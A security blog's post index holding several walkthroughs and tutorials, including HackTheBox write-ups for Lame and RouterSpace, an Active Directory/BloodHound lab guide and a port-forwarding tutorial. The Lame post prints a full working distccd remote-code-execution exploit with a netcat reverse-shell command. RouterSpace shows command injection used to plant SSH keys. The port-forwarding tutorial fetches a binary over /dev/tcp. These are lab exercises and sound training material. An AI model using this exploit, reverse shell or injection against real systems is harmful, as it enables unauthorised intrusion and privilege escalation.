[ { "title": "Web Security - API Testing Learning Path", "url": "/blog/posts/WSApiTesting/", "categories": "Web Security, API Testing", "tags": "Web, Portswigger, API", "date": "2024-09-15 00:00:00 +0200", "snippet": "New Series: Solving Web Security Academy Labs on YouTube!Hey everyone!I‚Äôm excited to kick off a new series both here on the blog and over on my YouTube channel! üéâ I‚Äôll be tackling the Web Security Academy from PortSwigger and creating video tutorials on how to solve their labs. If you‚Äôre looking to improve your web security skills, these posts are for you!Each post will focus on one learning path, and I‚Äôll upload a video for each lab within that path. This way, you can follow along step by step and learn as we go.Quick heads-up: the videos will be in Spanish, and I‚Äôm just starting out with video creation, so apologies in advance for the unique editing style. üòÖ They‚Äôre simple screen recordings (no fancy intros, no face cams‚Äîjust me, the labs, and my trusty mouse). Hopefully, the content will make up for the lack of Hollywood production!For this first post, I‚Äôm covering the API Testing learning path, which includes 4 labs. Whether you‚Äôre curious about API vulnerabilities or just want to brush up on your skills, you‚Äôre in the right place!Thanks for joining me on this journey‚Äîhopefully, we‚Äôll learn (and maybe cry) together as we work through these labs. üòÑ Don‚Äôt forget to subscribe to my YouTube channel for the latest updates, and feel free to reach out with any questions or feedback!Let‚Äôs crack those labs!Here are the videos:Lab 1: Exploiting an API endpoint using documentationTo solve this lab, you‚Äôll need to know: What API documentation is. How API documentation may be useful to an attacker. How to discover API documentation.Lab 2: Finding and exploiting an unused API endpointTo solve this lab, you‚Äôll need to know: How to use URL query syntax to attempt to change a server-side request. How to use error messages to build an understanding of how a server-side API processes user input.Lab 3: Exploiting a mass assignment vulnerabilityTo solve this lab, you‚Äôll need to know: How to use error messages to construct a valid request. How HTTP methods are used by RESTful APIs. How changing the HTTP method can reveal additional functionality.Lab 4: Lab: Exploiting server-side parameter pollution in a query stringTo solve this lab, you‚Äôll need to know: What mass assignment is. Why mass assignment may result in hidden parameters. How to identify hidden parameters. How to exploit mass assignment vulnerabilities." }, { "title": "Red Team Ops (CRTO)", "url": "/blog/posts/CRTO/", "categories": "Certifications, Red Team", "tags": "AD, RT, Cobalt Strike", "date": "2023-12-22 19:55:00 +0100", "snippet": "Red Teams OpsOn 22 December 2023 I obtained my Red Team Operator certification offered by Zero-Point Security.Red Team Ops is an online, self-study course that teaches the basic principles, tools and techniques synonymous with red teaming.The Exam is a practical CTF-style event driven by Snap Labs. It‚Äôs an assumed breach scenario by which the student must emulate an adversary using the provided threat profile as a guide.Here you can see my certification Bagde.My opinion about the course and the exam is that it is a very good option for intermediate profiles who want to go into Red Teaming. The course is very well explained and so is the presentation. You are not going to find yourself with an 800 page pdf. The lab is very stable and includes all the tools you need. The whole course is based on using Cobalt Strike, a great C2 that will make your life much easier. I really enjoyed it, both the course and the exam. For the exam, if you have done the course you will be able to pass it without any problem. That‚Äôs another thing I liked, you won‚Äôt find anything you haven‚Äôt seen in the theory.Below is a diagram I made during the study, showing some of the steps in the flow of a Red Team exercise learnt during the course." }, { "title": "Router Space HTB Walkthrough ", "url": "/blog/posts/RouterSpace/", "categories": "HTB, Walkthrough", "tags": "apk, command injection, CVE-2021-3156", "date": "2023-06-09 12:28:00 +0200", "snippet": "Initial FootholdWe start with a basic nmap. We see that we have port 22 (ssh) and 80 (http) open.On port 80, we find the following web application:The download button will download an apk file.If we install this program in an emulator, in our case anbox, we can see the following application:To see if the application makes any http requests, we can set burp as a proxy and intercept the requests.To do this, we can configure the burp as follows:In the address field, we use the IP of our HTB vpn, in my case the tun0 interface IP address. Using adb, we configure the anbox emulator proxy:adb shell settings put global http_proxy &amp;lt;IP&amp;gt;:8080Once configured, we will see the following request made by the application:We send this request to the repeater.If we try to launch it again, it will give us the following error:Unknown host: routerspace.htbTo fix this, we add routerspace.htb to /etc/host. Once added, the request will work for us.If we modify the IP parameter, to try to inject a command, we see in the response that it is simply reflected:But if we try to bypass the filter with the following characters, for example: ;, |, \\n, we see in the response the result of the command.If we try to send ourselves a reverse shell, it will not reach us. Surely there is some rule in the firewall.Gain accessRemember that we had an ssh service running on the victim machine.Check if the /home/paul/.ssh/authorized_keys file exists:We can generate an rsa key for ssh and write the public key to the authorized_keys file to gain access to the server via ssh.To generate the keys:ssh-keygen -t rsaTo upload the public key:; echo &#39;public key&#39;Once uploaded, we can connect with the following command:ssh -i id_rsa paul@10.10.11.148In paul‚Äôs home, we have the user.txt.Privilege EscalationTo escalate privileges, we will use LinPEAS.sh.To transfer the file to the victim machine, we can do it through scp:scp -i id_rsa ~/tools/PrivEsc/linux/linpeas.sh paul@10.10.11.148:.Execute:./linpeas.shIn the output of the tool, ee see that it is vulnerable to CVE-2021-3156 (Sudo Baron Samedit) as is is shown in the image below:To exploit the vulnerability we will use the following exploit: Exploit (Worawit)Transfer the exploit using scp and execute it:And finally, we are root! üî•" }, { "title": "Starting with Active Directory and BloodHound", "url": "/blog/posts/ADBloodHound/", "categories": "Tutorials, BloodHound, AD", "tags": "BloodHound, AD, FakeAd", "date": "2022-03-20 19:55:00 +0100", "snippet": "Hi all! In this post, I want to show you how to mount a simulated Active Directory and how to install and use the BloodHound tool.Requirements A Windows machine. Virtualization software (in this case, VMware) A Kali linux machine.BloodHound set-upBloodHound is a data analysis tool which uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. Defenders can use BloodHound to identify and eliminate those same attack paths. Both blue and red teams can use BloodHound to easily gain a deeper understanding of privilege relationships in an Active Directory environment.Before installing BloodHound, we need to install Neo4j. In my case, I will do it on my windows machine, but also you can do it on macOS or Linux.Steps for install: Download the Windows installer for Oracle JDK 11 from https://www.oracle.com/java/technologies/javase-jdk11-downloads.html Use the installer to install Oracle JDK. The default options work fine. Download the neo4j Community Server Edition zip from https://neo4j.com/download-center/#community Unzip the neo4j zip file. Open a command prompt, running as administrator. Change directory to the unzipped neo4j folder. Change directory to the bin directory in the Neo4j folder. Run the following command: C:\\&amp;gt; neo4j.bat install-service Open a web browser and navigate to http://localhost:7474/. You should see the neo4j web console. Authenticate to neo4j in the web console with username neo4j, password neo4j. You‚Äôll be prompted to change this password. Now, we can install BloodHound GUI from https://github.com/BloodHoundAD/BloodHound/releases Unzip the folder and double click BloodHound.exe Authenticate with the credentials you set up for neo4jif you need more details about the installation or if you are using another OS, Here you have the oficial installation guide.Build a simulated ADDownload an image of windows server and build a virtual machine.In this post, I will use Windows server 2016. Click here to download the ISO image.Then, build a virtual machine with the downloaded ISO file.Configuring the ADYou can follow the next steps to build your AD: Firstly, I will change the name of the machine (System -&amp;gt; System Properties -&amp;gt; Computer Name): In order to see the name changed, we need no restart the computer Now click on add roles and features and click on next: Click next again. Select a server from the server pool, select you computer and click next. Click next. In Features, select Active Directory Domain services and next. Next. Next. Click on install and wait. Now, promote this server to domain controller: a new pop-up is open, select add new forest and write your domain name (ins this case Mylab.Internal). Now choose a new password for DSRM In DNS options, click next. Choose a NetBios name (leave the default name that appears): Leave the default paths: Click next on review options. Now check if all prerequisites are met. (You need to set a password for the Administrator account in order to meet all prerequisites). The server will be restarted at the end of the installation process. Populate the ADNow we are going to populate the AD with BadBlood.BadBlood fills a Microsoft Active Directory Domain with a structure and thousands of objects. The output of the tool is a domain similar to a domain in the real world. After BadBlood is ran on a domain, security analysts and engineers can practice using tools to gain an understanding and prescribe to securing Active Directory. Each time this tool runs, it produces different results. The domain, users, groups, computers and permissions are different.To run BadBlood, clone the repository and run the following command:./badblood/invoke-badblood.ps1Then , we can see an output like this one:BloodHoundNow is time to extract all this information for BloodHound. We will use BloodHound.py, from our Kali. We can install it using pip:pip install bloodhoundTo use the ingestor, at a minimum we will need credentials of the domain we are logging in to. You will need to specify the -u option with a username of this domain. In this case we have an administrator user of the domain controller, so we will see al data of the AD.To run the ingestor:bloodhound-python -u micky -p Test1234 -ns 192.168.164.130 -d Mylab.Internal -c allHere you can see the output:After the execution of the ingestor, we will see the following output files:Now is time to use these files to feed our bloodhound.Import the DatabaseWe can import the json files, using the import data button:After the import, we will see the following window that shows the import progress:Now we can see the Database updated:In the menu showed above, we can see three tabs. The first one, shows information about the Database, how many users we have, groups, computers, etc. The second one, shows the information of a node. And finally we have the Analysis tab, where we can make requests to database to see relevant information about the AD.Let‚Äôs see one interesting query we can do if we are trying to get access to a domain controller.The image above shows us the users who are domain administrators. If we wanted to have control of the AD, we could, for example, try to find the credentials of these users.If we select a node of the graph:We can see the information related to that user in the second tab of the menu. Here, it is possible to see the last logon of the user, if it is enabled, if it has admin rights etc. All that kind of information is very useful.Feel free to play with this database and try to find paths or misconfigurations, in order to gain access to the domain controller.Bloodhound is a very useful tool, which will help us in our red team exercises, to find the most feasible way to achieve our goals.This blog tries to explain how to set up a fake Active Directory, and how to install and start using bloodhound in our exercises.In future blogs, I hope to write about the main vulnerabilities and their exploits and how to identified them using BloodHound.I hope to see you soon,See ya!" }, { "title": "Lame HTB Walkthrough ", "url": "/blog/posts/Lame/", "categories": "HTB, Walkthrough", "tags": "CVE-2004-2687, lse.sh, setuid", "date": "2022-03-15 10:55:00 +0100", "snippet": "Lame was the first box released on HTB. It is a very easy machine that can be solved with metaesploit, but in this post we are going to solve this machine without it.ReconFirstly, we do our common nmap scan:kali@kali:~$ nmap -sC -sV -p21,22,139,445,3632 -Pn -n 10.10.10.3 Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-11-28 20:30 CET Nmap scan report for 10.10.10.3 Host is up (0.033s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.14.12 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | vsFTPd 2.3.4 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) | ssh-hostkey: | 1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA) |_ 2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 3632/tcp open distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_ms-sql-info: ERROR: Script execution failed (use -d to debug) |_smb-os-discovery: ERROR: Script execution failed (use -d to debug) |_smb-security-mode: ERROR: Script execution failed (use -d to debug) |_smb2-time: Protocol negotiation failed (SMB2)We can see that ftp, ssh, smb and DistCC Daemon ports open.If we focus on port 3632/DistCC Daemon, we can see that it has a vulnerability that we can exploit to gain remote access.ExploitThe vulnerability is registered as CVE-2004-2687. In order to exploit this vulnerability, without metaesploit, we can use this script in python distccd_rce_CVE-2004-2687.pycode:# -*- coding: utf-8 -*-&#39;&#39;&#39; distccd v1 RCE (CVE-2004-2687) This exploit is ported from a public Metasploit exploit code : https://www.exploit-db.com/exploits/9915 The goal of that script is to avoid using Metasploit and to do it manually. (OSCP style) I&#39;m aware a Nmap script exists but for some reason I could not get it to work. Lame Box (HTB): local&amp;gt;nc -lvp 1403 local&amp;gt;./disccd_exploit.py -t 10.10.10.3 -p 3632 -c &quot;nc 10.10.14.64 1403 -e /bin/sh&quot; Enjoy your shell Jean-Pierre LESUEUR @DarkCoderSc&#39;&#39;&#39;import socketimport stringimport randomimport argparse&#39;&#39;&#39; Generate a random alpha num string (Evade some signature base detection?)&#39;&#39;&#39;def rand_text_alphanumeric(len): str = &quot;&quot; for i in range(len): str += random.choice(string.ascii_letters + string.digits) return str&#39;&#39;&#39; Read STDERR / STDOUT returned by remote service.&#39;&#39;&#39;def read_std(s): s.recv(4) # Ignore len = int(s.recv(8), 16) # Get output length if len != 0: return s.recv(len)&#39;&#39;&#39; Trigger Exploit&#39;&#39;&#39;def exploit(command, host, port): args = [&quot;sh&quot;, &quot;-c&quot;, command, &quot;#&quot;, &quot;-c&quot;, &quot;main.c&quot;, &quot;-o&quot;, &quot;main.o&quot;] payload = &quot;DIST00000001&quot; + &quot;ARGC%.8x&quot; % len(args) for arg in args: payload += &quot;ARGV%.8x%s&quot; % (len(arg), arg) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) socket.setdefaulttimeout(5) s.settimeout(5) if s.connect_ex((host, port)) == 0: print(&quot;[\\033[32mOK\\033[39m] Connected to remote service&quot;) try: s.send(payload) dtag = &quot;DOTI0000000A&quot; + rand_text_alphanumeric(10) s.send(dtag) s.recv(24) print(&quot;\\n--- BEGIN BUFFER ---\\n&quot;) buff = read_std(s) # STDERR if buff: print(buff) buff = read_std(s) # STDOUT if buff: print(buff) print(&quot;\\n--- END BUFFER ---\\n&quot;) print(&quot;[\\033[32mOK\\033[39m] Done.&quot;) except socket.timeout: print(&quot;[\\033[31mKO\\033[39m] Socket Timeout&quot;) except socket.error: print(&quot;[\\033[31mKO\\033[39m] Socket Error&quot;) except Exception: print(&quot;[\\033[31mKO\\033[39m] Exception Raised&quot;) finally: s.close() else: print(&quot;[\\033[31mKO\\033[39m] Failed to connect to %s on port %d&quot; % (host, port))parser = argparse.ArgumentParser(description=&#39;DistCC Daemon - Command Execution (Metasploit)&#39;)parser.add_argument(&#39;-t&#39;, action=&quot;store&quot;, dest=&quot;host&quot;, required=True, help=&quot;Target IP/HOST&quot;)parser.add_argument(&#39;-p&#39;, action=&quot;store&quot;, type=int, dest=&quot;port&quot;, default=3632, help=&quot;DistCCd listening port&quot;)parser.add_argument(&#39;-c&#39;, action=&quot;store&quot;, dest=&quot;command&quot;, default=&quot;id&quot;, help=&quot;Command to run on target system&quot;)try: argv = parser.parse_args() exploit(argv.command, argv.host, argv.port)except IOError: parse.errorTo use the exploit:kali$&amp;gt; nc¬†-lvp¬†1403#in other shell, execute the python file kali$&amp;gt; disccd_exploit.py¬†-t¬†10.10.10.3¬†-p¬†3632¬†-c¬†&quot;nc¬†10.10.14.64¬†1403¬†-e¬†/bin/sh&quot;In this way, we will gain access to the victim machine with the user daemon.Privilege escalationAfter gain access to the victim machine, we can use the lse.sh tool to enumerate flaws that allow us to escalate privileges.lame$&amp;gt; ./lse.shin the output of the tool, it is possible to see that nmap has the setuid active:We can exploit this very easily to escalate privileges. Execute the following commands:lame$&amp;gt; nmap¬†--interactive !sh sh-3.2#¬†cat¬†/root/root.txt¬† And finally we are root, and we can use the cat command to achieve the root flag.I hope you liked it,See ya!" }, { "title": "Basic Port Forwarding Techniques", "url": "/blog/posts/PortForwarding/", "categories": "Tutorials, Port Forwarding", "tags": "ssh, chisel, socat, netcat, msf", "date": "2022-03-08 11:28:00 +0100", "snippet": "In this post we will see different port forwarding tools and techniques.To see the different examples, we will use the following fictitious scenario.Our attacking Kali machine (192.168.164.133) and our victim Ubuntu machine (192.168.164.130) which is running a python simple HTTP server only accessible locally.The different tools that we are going to see are: SSH Chisel Socat Netcat Msfconsole / meterpreterSHHWe can pivot using ssh in three different ways: SSH Local port forwarding SSH Remote port forwarding SSH Dynamic port forwarding (SOCKS)SSH Local port forwarding root@kali:~$ ssh -L 9000:127.0.0.1:8000 ust@192.168.164.130This command will make the remote web server accessible, on our localhost on port 9000.SSH Remote port forwarding victim@ubuntu:~$ sudo ssh -R 9090:localhost:8000 kali@192.168.164.133We have to run this command from the victim machine, once we have gained access to it. With this command, we will be able to access from our Kali to the remote application in our localhost, port 9090.SSH Dynamic port forwarding (SOCKS)First we need to configure our proxychains file: /etc/proxychains.confWe set socks4 on port 9000.Then we run the following ssh command: root@kali:~$ ssh -D 9000 victim@192.168.164.130After that, we need to configure the proxy in our browser (in this case, using foxyproxy.)We set the Proxy Type as SOCKS4 and use the configuration we put in the proxychains.conf file.Finally, we will be able to reach the remote HTTP server from our Kali as is it shown in the image below.ChiselHow to install and execute Chisel:Kali machine:root@kali:~/tools$ git clone https://github.com/jpillora/chisel.gitroot@kali:~/tools$ cd chiselroot@kali:~/tools/chisel$ go build ‚Äìldflags=‚Äú-s ‚Äìw‚Äùroot@kali:~/tools/chisel$ upx brute chisel root@kali:~/tools/chisel$ nc -lvnp 6666 &amp;lt; chiselroot@kali:~/tools/chisel$ ./chisel server -p 8002 -reverse -vVictim machine:ust@ubuntu:~/tmp$ cat &amp;lt; /dev/tcp/192.168.164.133/6666 &amp;gt; chiselust@ubuntu:~/tmp$ chmod 755 chiselust@ubuntu:~/tmp$ ./chisel client 192.168.164.133:8002 R:127.0.0.1:8000Then we will be able to reach the remote HTTP server in our localhost port 8000.Socatroot@kali:~/tools$ socat TCP-LISTEN:localport,fork,reuseaddr TCP:remoteIP:remoteportroot@kali:~/tools$ socat TCP-LISTEN:10000,fork,reuseaddr TCP:192.168.164.130:8000Netcatroot@kali:~/tools$ mknod pivot proot@kali:~/tools$ nc -l -p 12000 0&amp;lt;pivot | nc 192.168.164.130 8000 1&amp;gt;pivotMsfconsole / meterpreterUse auxiliary/scanner/ssh/ssh_login module to create a sessionroot@kali:~/tools$ msfconsolemsf5 use auxiliary/scanner/ssh/ssh_loginmsf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; set rhosts 192.168.164.130msf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; set username victimmsf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; set password passmsf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; exploit msf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; sessions -l msf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; sessions -u ‚Äòid‚Äômsf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; sessions -i ‚Äòid‚ÄôOnce connected, use the meterpreter session opened and do the port forwarding:meterpreter &amp;gt; portfwd -hmeterpreter &amp;gt; portfwd add -l 1234 -p 8000 -r 192.168.164.130meterpreter &amp;gt; portfwd listPracticeIf you want to practice the techniques and tools explained in this post, you can make the following hack the box machines: Granny Grandpa Vault Reddish" } ]
